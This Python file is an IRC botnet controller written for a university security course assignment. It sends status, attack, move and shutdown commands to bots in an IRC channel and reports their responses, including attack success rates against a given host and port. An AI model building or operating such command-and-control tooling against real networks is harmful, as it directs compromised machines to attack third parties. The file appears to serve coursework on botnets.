"""
conbot.py
IRC controller for bots

Written by Neil Hagstrom and Christopher Neave.
Created for CPSC 526 at the University of Calgary
"""

import argparse
import sys
import socket
import time


#used to send to a channel
def chat(sock, channel,  msg):
    """
    Send a chat message to the server.
    Keyword arguments:
    sock -- the socket over which to send the message
    channel  -- the channel to be sent to
    msg  -- the message to be sent
    """
    sock.send(("PRIVMSG #{} :{}\r\n".format(channel, msg)).encode("utf-8"))
  
#send status message to the server and report what bots responded with their information    
def status(soc, chan):
    chat(soc, chan, "status")
    timeout = time.time()+5 #5s from now
    response = ""
    while True:
        if(time.time() > timeout):
            break
        try:
            response += soc.recv(1024).decode("utf-8")
        except socket.error:
            None
    responses = response.split("\r\n")
    print("The that responded to the status request are:")
    count = 0
    for str in responses:
        if(len(str) >0) :
            print("\t",str.split(":")[2])
            count += 1
    print("For a total of {} bots".format(count))

#send attack message to the bots and have them respond with their attack diagnostics    
def attack(soc, chan, hostname, port):
    chat(soc, chan, "attack {} {}".format(hostname, port))
    timeout = time.time()+5 #5s from now
    response = ""
    while True:
        if(time.time() > timeout):
            break
        try:
            response += soc.recv(1024).decode("utf-8")
        except socket.error:
            None
    responses = response.split("\r\n")
    total = 0
    successes = 0
    failures = 0
    for str in responses:
        botname = str.split("!")
        botname = botname[0]
        if(len(str) > 0 and "ING" not in str):
            total += 1
            if "Success" in str:
                print("{}: Attack successful".format(botname[1:])) 
                successes +=1
            else:
                print("{}: Attack failed".format(botname[1:]))
                failures +=1
    if(total == 0):
        print("No attacks were carried out")
    else:
        print("There were a total of {} attacks with {} successes and {} failures for a {}% success rate".format(total, successes,failures,(successes/total)*100))

#send move message to the bots and report what bots moved with their information  
def move(soc, chan, hostname, port, channel):
    chat(soc, chan, "move {} {} {}".format(hostname, port, channel))
    timeout = time.time()+5 #5s from now
    response = ""
    while True:
        if(time.time() > timeout):
            break
        try:
            response += soc.recv(1024).decode("utf-8")
        except socket.error:
            None
    responses = response.split("\r\n")
    total = 0
    for str in responses:
        if(len(str) > 0 and "EOT" in str):
            total += 1
            
    if(total == 0):
        print("No moves were carried out")
    else:
        print("There were a total of {} bots moved to the new server".format(total))

#send shutdown message to bots and report which ones shut down
def shutdown(soc, chan):
    chat(soc,chan,"shutdown")
    timeout = time.time()+5 #5s from now
    response = ""
    while True:
        if(time.time() > timeout):
            break
        try:
            response += soc.recv(1024).decode("utf-8")
        except socket.error:
            None
    responses = response.split("\r\n")
    shutdown = []
    for str in responses:
        if len(str)>0 and "shutdown" in str:
            starting = str.find("shutdown")
            shutdown.append(str[starting+9:])         
    print("The bots that were shut down are:")
    for bot in shutdown:
        print("\t",bot)
    print("For a total of {} bots".format(len(shutdown)))
    
    
#start initial connection
def connect(name, args):
    sock = socket.socket()
    sock.connect((args.hostname, args.port))
    sock.send("NICK {}\r\n".format(name).encode("utf-8"))
    sock.settimeout(.1)
    sock.send("USER {} * * {}\r\n".format(name,name).encode("utf-8"))
    sock.send("JOIN #{}\r\n".format(args.channel).encode("utf-8"))
    return sock, name
    
    
#Ensures a valid port is given to the program
def port_type(x):
    x = int(x)
    if x not in range(1,65535):
        raise argparse.ArgumentTypeError("Port must be integers in the range 1-65535")
    return x 
    
#initialize command line arguments    
def parseArgs():
    #Set up the required arguements
    parser = argparse.ArgumentParser(description = "Bot for CPSC526 Assignment 5")
    parser.add_argument("hostname", type = str, help="The target for the bot to connect to")
    parser.add_argument("port", type = port_type, help="The target port for the bot to connect to")
    parser.add_argument("channel", type=str,help="The IRC channel to join")
    parser.add_argument("secret", type=str, help="The secret phrase to listen for")
    args = parser.parse_args()
    return args

def main():
    #initialize variables and connect to server
    args = parseArgs()
    soc, name = connect("conbotg32",args)
    time.sleep(.5)
    chat(soc, args.channel, args.secret)
    try:
        response = soc.recv(1024).decode("utf-8")
        print(response)
    except Error:
        print("Error recieving from socket")
    while True:
        #run loop checking for messages in the server
        try:
            response = soc.recv(1024).decode("utf-8")
            print(response)
            if response.find ( 'PING' ) != -1:
                soc.send ( ('PONG ' + response.split() [ 1 ] + '\r\n').encode("utf-8"))
        except socket.error:
            None
        message = input("What would like to send to the IRC server: ")
        if(message == "status"):
                status(soc, args.channel)
        elif(message == "quit"):
            break
        elif(message == "shutdown"):
            shutdown(soc,args.channel)
        else:
            inputlist = message.split()
            if(inputlist[0] == "attack" and len(inputlist) == 3):
                attack(soc, args.channel, inputlist[1], inputlist[2])
            elif(inputlist[0] == "move" and len(inputlist) == 4):
                move(soc, args.channel, inputlist[1], inputlist[2], inputlist[3])
      
    soc.close()
    print("Shutting down the controller...")

main()